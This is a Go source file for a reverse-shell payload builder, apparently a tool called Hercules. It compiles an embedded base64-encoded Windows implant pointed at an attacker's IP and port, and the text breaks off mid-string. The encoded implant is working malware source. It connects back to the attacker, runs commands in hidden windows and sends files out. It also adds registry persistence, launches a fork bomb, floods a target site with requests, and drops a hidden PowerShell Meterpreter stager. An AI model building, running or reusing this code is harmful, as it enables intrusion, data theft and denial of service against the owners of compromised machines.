package main



import "strings"
import "fmt"
import "os"
import "runtime"
import "os/exec"
import "path/filepath"
import "encoding/base64"
import "github.com/fatih/color"



func main() { // 192.168.1.1 8888 -p windows -a x86 -l static 
  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
  ARGS := os.Args[1:]

  var ARG string
  var PAYLOAD string = "Windows"
  var ARC string = "386" 
  var LINKER string = "static"

  if len(ARGS) == 0 {
    color.Yellow(HELP)
    os.Exit(1)
  }

  if len(ARGS[0]) < 7 || len(ARGS[0]) > 15 {
    color.Red("\n[-] ERROR : Invalid IP !")
    os.Exit(1)
  }

  if len(ARGS[1]) < 1 || len(ARGS[1]) > 5 {
    color.Red("\n[-] ERROR : Invalid Port !")
    os.Exit(1)
  }

  for i := 0; i < len(ARGS); i++ {
    if i == 0 {
      ARG = ARGS[i]
    }else{
      ARG = (ARG +" "+ ARGS[i])
    }
  }

  if strings.Contains(ARG, "-a x86") || strings.Contains(ARG, "-A X86") || strings.Contains(ARG, "-A x86") || strings.Contains(ARG, "-a X86") {
    ARC = "386"
  }else if strings.Contains(ARG, "-a x64") || strings.Contains(ARG, "-A X64") || strings.Contains(ARG, "-a X64") || strings.Contains(ARG, "-A x64") {
    ARC = "amd64"
  }else if strings.Contains(ARG, "-a") || strings.Contains(ARG, "-A") {
    color.Red("\n[-] ERROR : Invalid Architecture !")
    os.Exit(1)
  }

 if  strings.Contains(ARG, "-l static") || strings.Contains(ARG, "-L STATIC") || strings.Contains(ARG, "-l STATIC") || strings.Contains(ARG, "-L static") {
  LINKER =  "static"
 }else if strings.Contains(ARG, "-l dynamic") || strings.Contains(ARG, "-L DYNAMIC") || strings.Contains(ARG, "-l DYNAMIC") || strings.Contains(ARG, "-L dynamic") {
  LINKER = "dynamic"
 }else if strings.Contains(ARG, "-l") {
  color.Red("\n[-] ERROR : Invalid Linker !")
  os.Exit(1)
 }




  if strings.Contains(ARG, "-p windows") || strings.Contains(ARG, "-P WINDOWS") || strings.Contains(ARG, "-p Windows") || strings.Contains(ARG, "-P windows") || strings.Contains(ARG, "-p WINDOWS") || strings.Contains(ARG, "-P Windows") {
    WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
    PAYLOAD = "Windows"
  }else if strings.Contains(ARG, "-p linux") || strings.Contains(ARG, "-P LINUX") || strings.Contains(ARG, "-p Linux") || strings.Contains(ARG, "-P linux") || strings.Contains(ARG, "-p LINUX") || strings.Contains(ARG, "-P Linux") {
    LINUX_PAYLOAD, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(LINUX_PAYLOAD), ARC, LINKER)
    PAYLOAD = "Linux"
  }else if strings.Contains(ARG, "-p osx") || strings.Contains(ARG, "-P OSX") || strings.Contains(ARG, "-p OSX") || strings.Contains(ARG, "-P osx") {
    OSX_PAYLOAD, _ := base64.StdEncoding.DecodeString(OSX_PAYLOAD)
    GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(OSX_PAYLOAD), ARC, LINKER)
    PAYLOAD = "OSX"
  }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
    color.Red("\n[-] ERROR : Invalid Payload !")
    os.Exit(1)
  }else {
  	WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
  	GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
  }


  color.Blue("\n\n[*] Payload : "+PAYLOAD)
  color.Blue("\n[*] Architecture : "+ARC)
  color.Blue("\n[*] Linker : "+LINKER)
  color.Green(string("\n\n[+] Payload generated as Payload.exe at "+dir)) 
}


func GENERATE_PAYLOAD(IP string, PORT string, PAYLOAD string, ARC string, LINKER string) {

  IP = string("\""+IP+"\";")
  PORT = string("\""+PORT+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(PAYLOAD, "\"127.0.0.1\";", IP, -1)
  Index = strings.Replace(Index, "\"8552\";", PORT, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    if LINKER == "static" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui\" Payload.go ")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui -s\" Payload.go ")
    }


    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    } 
    Builder.WriteString(LINKER)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    if LINKER == "static" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }

    exec.Command("sh", "-c", LINKER).Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}





var WINDOWS_PAYLOAD string = `CnBhY2thZ2UgbWFpbjsKCmltcG9ydCAibmV0IjsKaW1wb3J0ICJvcy9leGVjIjsKaW1wb3J0ICJidWZpbyI7CmltcG9ydCAib3MiOwppbXBvcnQgInN0cmluZ3MiOwppbXBvcnQgInBhdGgvZmlsZXBhdGgiOwppbXBvcnQgInN5c2NhbGwiOwppbXBvcnQgIm5ldC9odHRwIjsKaW1wb3J0ICJ0aW1lIjsKaW1wb3J0ICJpbyI7CmltcG9ydCAiYnl0ZXMiCmltcG9ydCAiY29tcHJlc3MvZmxhdGUiCmltcG9ydCAiZW5jb2RpbmcvYmFzZTY0IgoKCgpjb25zdCBJUCBzdHJpbmcgPSAiMTI3LjAuMC4xIjsKY29uc3QgUE9SVCBzdHJpbmcgPSAiODU1MiI7CmNvbnN0IFRJTUVfREVMQVkgdGltZS5EdXJhdGlvbiA9IDU7Ly9TZWNvbmQKCnZhciBHTE9CQUxfQ09NTUFORCBzdHJpbmc7CnZhciBET1NfVGFyZ2V0IHN0cmluZzsKdmFyIERPU19SZXF1ZXN0X0NvdW50ZXIgaW50ID0gMDsKdmFyIERPU19SZXF1ZXN0X0xpbWl0IGludCA9IDEwMDA7Cgp2YXIgSVBfUE9SVCBzdHJpbmc7CgpmdW5jIG1haW4oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrUE9SVCk7ICAgICAgICAgICAgICAgICAgICAgICAKICBpZiBlcnIgIT0gbmlsIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgdGltZS5TbGVlcChUSU1FX0RFTEFZKnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgbWFpbigpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIH07ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIAogIGRpciwgXyA6PSBmaWxlcGF0aC5BYnMoZmlsZXBhdGguRGlyKG9zLkFyZ3NbMF0pKTsgICAgIAogIFZlcnNpb25fQ2hlY2sgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAidmVyIik7CiAgVmVyc2lvbl9DaGVjay5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIHZlcnNpb24sIF8gOj0gVmVyc2lvbl9DaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogIFN5c0d1aWRlIDo9IChCQU5ORVIrc3RyaW5nKHZlcnNpb24pICsgIlxuXG4iICsgc3RyaW5nKGRpcikgKyAiPiIpOyAgICAgIAogIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhTeXNHdWlkZSkpKTsgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAKICAKICBmb3IgewogICAgCiAgICBDb21tYW5kLCBfIDo9IGJ1ZmlvLk5ld1JlYWRlcihjb25uZWN0KS5SZWFkU3RyaW5nKCdcbicpOyAgICAgICAgICAgICAgICAgICAgICAgCiAgICBfQ29tbWFuZCA6PSBzdHJpbmcoQ29tbWFuZCk7ICAgICAgICAgICAgICAgICAgICAgIAogICAgR0xPQkFMX0NPTU1BTkQgPSBfQ29tbWFuZDsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgCgogICAgCiAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBsZWFzZSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UExFQVNFIikgeyAKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoU0FZX1BMRUFTRSgpKSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmRvd25sb2FkIC1mIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ET1dOTE9BRCAtRiAiKSB7CiAgICAgIGdvIERPV05MT0FEKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblsqXSBTZW5kaW5nIGZpbGUgdG8gLT4gIitJUCsiOjU1ODg4XG5cbiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnVwbG9hZCAtZiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+VVBMT0FEIC1GICIpIHsKICAgICAgZ28gVVBMT0FEKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblsqXSBSZWNlaXZpbmcgZmlsZSBmcm9tIC0+ICIrSVArIjo1NTg4OFxuXG4iKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifk1FVEVSUFJFVEVSIC1BIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5tZXRlcnByZXRlciAtYSIpIHsKICAgICAgVGVtcF9JUF9QT1JUIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICJcIiIpCiAgICAgIElQX1BPUlQgPSBzdHJpbmcoVGVtcF9JUF9QT1JUWzFdKQogICAgICBNRVRFUlBSRVRFUl9DUkVBVEUoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bK10gTWV0ZXJwcmV0ZXIgRXhlY3V0ZWQgIVxuXG4iK2RpcisiPiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ET1MiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmRvcyIpIHsKICAgICAgRE9TX0NvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIikKICAgICAgRE9TX1RhcmdldCA9ICBET1NfQ29tbWFuZFsxXQogICAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyhET1NfVGFyZ2V0KSwgImh0dHAiKSB7CiAgICAgICAgZ28gRE9TKCk7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gU3RhcnRpbmcgRE9TIGF0YWNrLi4uIisiXG5cblsqXSBTZW5kaW5nIDEwMDAgcmVxdWVzdCB0byAiK0RPU19UYXJnZXQrIiAhXG5cbiIrZGlyKyI+IikpOwogICAgICB9ZWxzZXsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblstXSBFUlJPUjogSW52YWxpZCB1cmwgIVxuXG4iK2RpcisiPiIpKTsKICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RElTVFJBQ1QiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmRpc3RyYWN0IikgeyAKICAgICAgRElTVFJBQ1QoKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5IRUxQIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5oZWxwIikgeyAKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKEhFTFArZGlyKyI+IikpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+UEVSU0lTVEVOQ0UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifnBlcnNpc3RlbmNlIikgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgZ28gUEVSU0lTVCgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsqXSBBZGRpbmcgcGVyc2lzdGVuY2UgcmVnaXN0cmllcy4uLlxuWypdIFBlcnNpc3RlbmNlIENvbXBsZXRlZFxuXG4iK2RpcisiPiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlewogICAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBfQ29tbWFuZCk7CiAgICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogICAgICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoIlxuXG4iK3N0cmluZyhvdXQpKyJcbiIrc3RyaW5nKGRpcikrIj4iKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoQ29tbWFuZF9PdXRwdXQpKTsKICAgIH07CiAgfTsKfTsKCgoKCgpmdW5jIFBFUlNJU1QoKSB7CiAgUEVSU0lTVCwgXyA6PSBvcy5DcmVhdGUoIlBFUlNJU1QuYmF0IikKCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygibWtkaXIgJUFQUERBVEElXFxXaW5kb3dzIisiXG4iKQogIFBFUlNJU1QuV3JpdGVTdHJpbmcoImNvcHkgIiArIG9zLkFyZ3NbMF0gKyAiICVBUFBEQVRBJVxcV2luZG93c1xcd2luZGxsLmV4ZVxuIikKICBQRVJTSVNULldyaXRlU3RyaW5nKCJSRUcgQUREIEhLQ1VcXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4gL1YgV2luRGxsIC90IFJFR19TWiAvRiAvRCAlQVBQREFUQSVcXFdpbmRvd3NcXHdpbmRsbC5leGUiKQoKICBQRVJTSVNULkNsb3NlKCkKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJQRVJTSVNULmJhdCIpOwogIEV4ZWMuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFeGVjLlJ1bigpOwogIENsZWFuIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgImRlbCBQRVJTSVNULmJhdCIpOwogIENsZWFuLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgQ2xlYW4uUnVuKCk7Cgp9OwoKCgpmdW5jIFVQTE9BRCgpIHsKICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIElQKyI6IisiNTU4ODgiKTsKICBpZiBlcnIgIT0gbmlsIHsKICAgIFVQTE9BRCgpOwogIH07CiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOwogIGZpbGUsIF8gOj0gb3MuQ3JlYXRlKGZpbGVfbmFtZVsxXSk7CiAgZmlsZV9uYW1lWzFdID0gc3RyaW5ncy5UcmltKGZpbGVfbmFtZVsxXSwgIiAiKTsKICBkZWZlciBmaWxlLkNsb3NlKCk7CiAgaW8uQ29weShmaWxlLCBjb25uZWN0KTsKICBmaWxlLkNsb3NlKCk7CiAgY29ubmVjdC5DbG9zZSgpOwp9OwoKCmZ1bmMgRE9XTkxPQUQoKSB7CiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrIjU1ODg4Iik7CiAgaWYgZXJyICE9IG5pbCB7CiAgICBET1dOTE9BRCgpOwogIH07CiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOwogIGZpbGUsIF8gOj0gb3MuT3BlbihmaWxlX25hbWVbMV0pOwogIGlvLkNvcHkoY29ubmVjdCwgZmlsZSk7CiAgZmlsZS5DbG9zZSgpOwogIGNvbm5lY3QuQ2xvc2UoKTsKfTsKCgoKCmZ1bmMgU0FZX1BMRUFTRSgpIChzdHJpbmcpewogIENvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIik7CiAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKCJwb3dlcnNoZWxsLmV4ZSAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIC1WZXJiIFJ1bkFzICIrc3RyaW5nKENvbW1hbmRbMV0pKSk7CiAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoc3RyaW5nKG91dCkpOwogIHJldHVybiBDb21tYW5kX091dHB1dDsKfTsKCgoKCmZ1bmMgRElTVFJBQ1QoKSB7CiAgdmFyIEZvcmtfQm9tYiBzdHJpbmcgPSAiOkFcbnN0YXJ0XG5nb3RvIEEiCiAgRl9Cb21iLCBfIDo9IG9zLkNyZWF0ZSgiRl9Cb21iLmJhdCIpCgogIEZfQm9tYi5Xcml0ZVN0cmluZyhGb3JrX0JvbWIpCgogIEZfQm9tYi5DbG9zZSgpCgogIGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIkZfQm9tYi5iYXQiKS5TdGFydCgpCgp9CgoKZnVuYyBET1MoKSB7CiAgZm9yIHsKICAgIERPU19SZXF1ZXN0X0NvdW50ZXIrKwogICAgcmVzcG9uc2UsIGVyciA6PSBodHRwLkdldChET1NfVGFyZ2V0KTsKICAgIGlmIGVyciAhPSBuaWwgewogICAgICBicmVhazsKICAgIH0KICAgIHJlc3BvbnNlLkJvZHkuQ2xvc2UoKTsKICAgIGlmIERPU19SZXF1ZXN0X0NvdW50ZXIgPCBET1NfUmVxdWVzdF9MaW1pdCB7CiAgICAgIGdvIERPUygpCiAgICB9ZWxzZXsKICAgICAgYnJlYWs7CiAgICB9IAogIH0KfQoKCgpmdW5jIE1FVEVSUFJFVEVSX0NSRUFURSgpIHsKCiAgdmFyIEJ1ZmZlciBieXRlcy5CdWZmZXIKICB2YXIgUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzIHN0cmluZyA9IFJFVkVSU0VfSFRUUFNfU0hFTEwoc3RyaW5nKElQX1BPUlQpKQoKICBGbGF0ZSwgXyA6PSBmbGF0ZS5OZXdXcml0ZXIoJkJ1ZmZlciw2KQogIGlmIF8sIGVyciA6PSBGbGF0ZS5Xcml0ZShbXWJ5dGUoUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzKSk7IGVyciAhPSBuaWwgewogICAgcGFuaWMoZXJyKQogIH0KICBpZiBlcnIgOj0gRmxhdGUuRmx1c2goKTsgZXJyICE9IG5pbCB7CiAgICBwYW5pYyhlcnIpCiAgfQogIGlmIGVyciA6PSBGbGF0ZS5DbG9zZSgpOyBlcnIgIT0gbmlsIHsKICAgIHBhbmljKGVycikKICB9CgogIEJ1ZmZlclN0cmluZyA6PSBCdWZmZXIuQnl0ZXMoKQogIEVuY29kZWRDb21wcmVzc2VkQnVmZmVyIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhbXWJ5dGUoQnVmZmVyU3RyaW5nKSkKCgogIHZhciBQU19NZXRlcnByZXRlciBzdHJpbmcgPSBDUkVBVEVfUFNfTUVURVJQUkVURVIoRW5jb2RlZENvbXByZXNzZWRCdWZmZXIpCgogIEZpbGUsIF8gOj0gb3MuQ3JlYXRlKCJXaW5kbGwuYmF0IikKICBGaWxlLldyaXRlU3RyaW5nKFBTX01ldGVycHJldGVyKQoKICBGaWxlLkNsb3NlKCk7CgogIFRlbXBDb21tYW5kIDo9IHN0cmluZygibW92ZSB3aW5kbGwuYmF0ICUiKyJBUFBEQVRBIisiJSIpCgogIE1vdmUgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBUZW1wQ29tbWFuZCk7CiAgTW92ZS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIE1vdmUuUnVuKCk7CgogIFRlbXBDb21tYW5kXzIgOj0gc3RyaW5nKCIlIisiQVBQREFUQSIrIiUiKyJcXHdpbmRsbC5iYXQiKQoKICBFeGVjIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgVGVtcENvbW1hbmRfMik7CiAgRXhlYy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWMuU3RhcnQoKTsKCn0KCgp2YXIgQkFOTkVSIHN0cmluZyA9IGAKICAgICAgICAgICAgICAgICAgX18gIF9fX19fX19fX19fXyAgX19fX19fX18gIF9fX18gICAgX19fX19fX19fX18KICAgICAgICAgICAgICAgICAvIC8gLyAvIF9fX18vIF9fIFwvIF9fX18vIC8gLyAvIC8gICAvIF9fX18vIF9fXy8KICAgICAgICAgICAgICAgIC8gL18vIC8gX18vIC8gL18vIC8gLyAgIC8gLyAvIC8gLyAgIC8gX18vICBcX18gXCAKICAgICAgICAgICAgICAgLyBfXyAgLyAvX19fLyBfLCBfLyAvX19fLyAvXy8gLyAvX19fLyAvX19fIF9fXy8gLyAKICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpgCgoKCgp2YXIgSEVMUCBzdHJpbmcgPSBgCgogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXwogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLwogICAgICAgICAgICAgICAgLyAvXy8gLyBfXy8gLyAvXy8gLyAvICAgLyAvIC8gLyAvICAgLyBfXy8gIFxfXyBcIAogICAgICAgICAgICAgICAvIF9fICAvIC9fX18vIF8sIF8vIC9fX18vIC9fLyAvIC9fX18vIC9fX18gX19fLyAvIAogICAgICAgICAgICAgIC9fLyAvXy9fX19fXy9fLyB8X3xcX19fXy9cX19fXy9fX19fXy9fX19fXy8vX19fXy8gIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgSEVSQ1VMRVMgUkVWRVJTRSBTSEVMTCAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKCn5QRVJTU0lTVEVOQ0UgICAgICAgICAgICAgICAgICAgICBJbnN0YWxscyBhIHBlcnNpc3RlbmNlIG1vZHVsZQoKfkRJU1RSQUNUICAgICAgICAgICAgICAgICAgICAgICAgIEV4ZWN1dGVzIGEgZm9yayBib21iIGJhdCBmaWxlIGZvciBkaXN0cmFjdGlvbiAgIAoKflBMRUFTRSAgICAgICAgICAgICAgICAgICAgICAgICAgIEFza3MgdXNlcnMgY29tZmlybWF0aW9uIGZvciBoaWdoZXIgcHJpdmlsaWRnZSBvcGVyYXRpb25zCgp+RE9TIC1BICJ3d3cudGFyZ2V0c2l0ZS5jb20iICAgICAgU3RhcnRzIGEgZGVuaWFsIG9mIHNlcnZpY2UgYXRhY2sKCn5NRVRFUlBSRVRFUiAtQSAiMTI3LjAuMC4xOjg4ODgiICBDcmVhdGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBjb25uZWN0aW9uIHRvIG1ldGFzcGxvaXQKCn5ET1dOTE9BRCAtRiAiZmlsZW5hbWUuZXhlIiAgICAgICBTZW5kcyB0aGUgc2VsZWN0ZWQgZmlsZSB0byB5b3VyIGlwIHRocnUgNTU4ODggcG9ydAoKflVQTE9BRCAtRiAiZmlsZW5hbWUuZXhlIiAgICAgICAgIFJlbW90ZSBtYWNoaW5lIHN0YXJ0cyBsaXN0ZW5pbmcgZm9yIGZpbGUgYXQgNTU4ODggcG9ydAoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKYAoKCgoKZnVuYyBDUkVBVEVfUFNfTUVURVJQUkVURVIoRW5jb2RlZENvbXByZXNzZWRCdWZmZXIgc3RyaW5nKSAoc3RyaW5nKSB7CiAgCgoKdmFyIFNoZWxsX1RlbXBsYXRlIHN0cmluZyA9IGBAZWNobyBvZmYKaWYgJVBST0NFU1NPUl9BUkNISVRFQ1RVUkUlPT14ODYgKHBvd2Vyc2hlbGwuZXhlIC1Ob1AgLU5vbkkgLVcgSGlkZGVuIC1FeGVjIEJ5cGFzcyAtQ29tbWFuZCAiSW52b2tlLUV4cHJlc3Npb24gJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAoJChOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCQoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0gKCwkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyhcImArRW5jb2RlZENvbXByZXNzZWRCdWZmZXIrYFwiKSkpKSwgW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSwgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkpLlJlYWRUb0VuZCgpOyIpIGVsc2UgKCVXaW5EaXIlXHN5c3dvdzY0X